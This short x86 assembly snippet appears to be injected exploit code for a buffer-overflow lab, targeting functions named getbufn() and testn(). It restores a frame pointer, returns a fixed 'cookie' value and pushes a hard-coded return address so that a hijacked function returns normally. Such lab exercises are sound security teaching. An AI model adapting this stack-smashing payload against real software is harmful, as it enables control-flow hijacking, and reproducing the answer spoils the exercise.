lea 0x28 (%esp)   , %ebp # restore ebp register contents
movl  $0x5a5102d9 , %eax # returns the cookie value
pushl $0x08048c2e        # return address pointing instruction after getbufn() call in testn()
ret
